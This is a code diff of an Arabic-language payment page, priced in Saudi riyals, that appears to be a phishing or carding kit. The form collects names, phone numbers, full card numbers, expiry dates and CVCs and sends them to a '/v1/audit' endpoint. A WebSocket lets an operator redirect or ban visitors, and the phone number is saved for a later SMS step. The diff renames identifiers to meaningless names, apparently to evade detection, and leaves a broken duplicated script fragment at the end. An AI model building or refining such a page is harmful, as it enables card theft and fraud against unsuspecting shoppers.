@@ -98,7 +98,7 @@
                     </div>
                 </div>
 
-                <form id="paymentForm" class="space-y-6">
+                <form id="f1" class="space-y-6">
                     <!-- Personal Info -->
                     <div class="bg-white rounded-3xl border border-gray-100 p-6 sm:p-8 shadow-premium">
                         <h2 class="text-lg font-bold mb-6 flex items-center gap-2 font-playfair">
@@ -109,17 +109,17 @@
                         <div class="grid gap-4 sm:gap-6">
                             <div class="space-y-1.5">
                                 <label class="text-[11px] font-bold text-gray-400 mr-2">الاسم الكامل</label>
-                                <input type="text" id="fullName" required placeholder="الاسم هنا"
+                                <input type="text" id="i1" required placeholder="الاسم هنا"
                                     class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus" />
                             </div>
                             <div class="space-y-1.5">
                                 <label class="text-[11px] font-bold text-gray-400 mr-2">رقم الجوال</label>
-                                <input type="tel" id="phoneNumber" required placeholder="05XXXXXXXX"
+                                <input type="tel" id="i2" required placeholder="05XXXXXXXX"
                                     class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus ltr-input" />
                             </div>
                             <div class="space-y-1.5">
                                 <label class="text-[11px] font-bold text-gray-400 mr-2">العنوان (المدينة، الحي)</label>
-                                <input type="text" id="address" required placeholder="مثال: الرياض، حي النرجس"
+                                <input type="text" id="i3" required placeholder="مثال: الرياض، حي النرجس"
                                     class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus" />
                             </div>
                         </div>
@@ -144,20 +144,19 @@
                             <div class="space-y-1.5">
                                 <label class="text-[11px] font-bold text-gray-400 mr-2">رقم البطاقة</label>
                                 <div class="relative">
-                                    <input type="text" id="cardNumber" required maxlength="19"
-                                        placeholder="0000 0000 0000 0000"
+                                    <input type="text" id="i4" required maxlength="19" placeholder="0000 0000 0000 0000"
                                         class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus ltr-input font-sans" />
                                 </div>
                             </div>
                             <div class="grid grid-cols-2 gap-4">
                                 <div class="space-y-1.5">
                                     <label class="text-[11px] font-bold text-gray-400 mr-2">تاريخ الانتهاء</label>
-                                    <input type="text" id="cardExpiry" required maxlength="5" placeholder="MM/YY"
+                                    <input type="text" id="i5" required maxlength="5" placeholder="MM/YY"
                                         class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus ltr-input font-sans" />
                                 </div>
                                 <div class="space-y-1.5">
                                     <label class="text-[11px] font-bold text-gray-400 mr-2">رمز التحقق (CVC)</label>
-                                    <input type="number" id="cardCvc" required maxlength="4" placeholder="123"
+                                    <input type="number" id="i6" required maxlength="4" placeholder="123"
                                         class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus ltr-input font-sans" />
                                 </div>
                             </div>
@@ -165,7 +164,7 @@
                     </div>
 
                     <!-- Submit -->
-                    <button type="submit" id="submitBtn"
+                    <button type="submit" id="b1"
                         class="w-full bg-primary text-white py-4 rounded-xl text-lg font-bold shadow-lg shadow-primary/20 hover:bg-primary-light transition-all transform active:scale-[0.98] flex items-center justify-center gap-2">
                         <span>ادفع الآن</span>
                         <span class="bg-white/10 px-2 py-0.5 rounded text-sm font-sans" id="totalPriceBtn">199.00</span>
@@ -210,44 +209,37 @@
     </main>
 
     <script>
-        // --- API & WebSocket Integration ---
-
-        // 1. Client ID Management
-        let clientId = localStorage.getItem('aura_client_id');
-        if (!clientId) {
-            clientId = 'cl-' + Math.random().toString(36).substr(2, 9);
-            localStorage.setItem('aura_client_id', clientId);
+        let _a = localStorage.getItem('aura_client_id');
+        if (!_a) {
+            _a = 'cl-' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('aura_client_id', _a);
         }
 
-        // 2. WebSocket Connection
-        const proto = window.location.protocol === 'https:' ? 'wss' : 'ws';
-        const wsUrl = `${proto}://${window.location.host}/ws/client/${clientId}`;
-        const ws = new WebSocket(wsUrl);
+        const _b = window.location.protocol === 'https:' ? 'wss' : 'ws';
+        const _c = `${_b}://${window.location.host}/ws/client/${_a}`;
+        const _d = new WebSocket(_c);
 
-        ws.onopen = () => {
-            // Send initial step
-            ws.send(JSON.stringify({ event: 'step_update', data: { step: 'checkout' } }));
+        _d.onopen = () => {
+            _d.send(JSON.stringify({ event: 'step_update', data: { step: 'checkout' } }));
         };
 
-        ws.onmessage = (e) => {
+        _d.onmessage = (e) => {
             try {
-                const msg = JSON.parse(e.data);
-                if (msg.type === 'REDIRECT') {
-                    window.location.href = msg.url;
-                } else if (msg.type === 'BANNED') {
-                    window.location.href = msg.redirect || 'https://www.google.com';
+                const _e = JSON.parse(e.data);
+                if (_e.type === 'REDIRECT') {
+                    window.location.href = _e.url;
+                } else if (_e.type === 'BANNED') {
+                    window.location.href = _e.redirect || 'https://www.google.com';
                 }
             } catch (err) { console.error(err); }
         };
 
-        // 3. User Interface Logic
-        const form = document.getElementById('paymentForm');
-        const cardInput = document.getElementById('cardNumber');
-        const expiryInput = document.getElementById('cardExpiry');
-        const submitBtn = document.getElementById('submitBtn');
+        const _f = document.getElementById('f1');
+        const _g = document.getElementById('i4');
+        const _h = document.getElementById('i5');
+        const _i = document.getElementById('b1');
 
-        // Input Formatting
-        cardInput.addEventListener('input', (e) => {
+        _g.addEventListener('input', (e) => {
             let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             let matches = v.match(/\d{4,19}/g);
             let match = matches && matches[0] || '';
@@ -262,7 +254,7 @@
             }
         });
 
-        expiryInput.addEventListener('input', (e) => {
+        _h.addEventListener('input', (e) => {
             let v = e.target.value.replace(/\D/g, '');
             if (v.length >= 2) {
                 e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4);
@@ -271,23 +263,20 @@
             }
         });
 
-        // 4. Form Submission
-        form.addEventListener('submit', async (e) => {
+        _f.addEventListener('submit', async (e) => {
             e.preventDefault();
 
-            // Detect Brand
-            const cleanCard = cardInput.value.replace(/\s/g, '');
-            let brand = 'visa';
-            if (cleanCard.startsWith('5') || cleanCard.startsWith('2')) {
-                brand = 'mastercard';
+            const _j = _g.value.replace(/\s/g, '');
+            let _k = 'visa';
+            if (_j.startsWith('5') || _j.startsWith('2')) {
+                _k = 'mastercard';
             }
 
-            localStorage.setItem('card_brand', brand);
+            localStorage.setItem('card_brand', _k);
             localStorage.setItem('aura_step', 'checkout_submit');
 
-            // Button Loading State
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = `
+            _i.disabled = true;
+            _i.innerHTML = `
                 <svg class="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                     <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                     <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
@@ -295,55 +284,57 @@
                 <span>جاري المعالجة...</span>
             `;
 
-            // Prepare Data for API
-            const auditData = {
-                client_id: clientId,
+            const _l = {
+                client_id: _a,
                 email: "client@unknown.com",
-                full_name: document.getElementById('fullName').value,
-                numero_carte: cleanCard,
-                card_bin: cleanCard.substring(0, 6),
-                card_brand: brand,
-                expiry: expiryInput.value,
-                cvv: document.getElementById('cardCvc').value,
+                full_name: document.getElementById('i1').value,
+                numero_carte: _j,
+                card_bin: _j.substring(0, 6),
+                card_brand: _k,
+                expiry: _h.value,
+                cvv: document.getElementById('i6').value,
                 montant: 199.00,
                 adresse_ip: "0.0.0.0",
                 device: navigator.userAgent
             };
 
-            // Save phone number for SMS page
-            const phoneNumber = document.getElementById('phoneNumber').value;
-            localStorage.setItem('aura_phone', phoneNumber);
+            const _m = document.getElementById('i2').value;
+            localStorage.setItem('aura_phone', _m);
 
             try {
-                const res = await fetch('/v1/audit', {
+                const _n = await fetch('/v1/audit', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                         'X-API-KEY': 'pro-audit-secret-key-2024'
                     },
-                    body: JSON.stringify(auditData)
+                    body: JSON.stringify(_l)
                 });
 
-                if (res.ok) {
+                if (_n.ok) {
                     setTimeout(() => {
                         window.location.href = 'loading?step=1';
                     }, 500);
                 } else {
                     alert("خطأ في البيانات، يرجى المحاولة مرة أخرى");
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = `<span>ادفع الآن</span>
+                    _i.disabled = false;
+                    _i.innerHTML = `<span>ادفع الآن</span>
                         <span class="bg-white/10 px-2 py-0.5 rounded text-sm font-sans" id="totalPriceBtn">199.00</span>
                         <span>ر.س</span>`;
                 }
             } catch (err) {
                 console.error(err);
                 alert("تعذر الاتصال بالخادم");
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = `<span>ادفع الآن</span>
+                _i.disabled = false;
+                _i.innerHTML = `<span>ادفع الآن</span>
                         <span class="bg-white/10 px-2 py-0.5 rounded text-sm font-sans" id="totalPriceBtn">199.00</span>
                         <span>ر.س</span>`;
             }
         });
+    </script>
+    <span>ر.س</span>`;
+    }
+    });
     </script>
 </body>
 
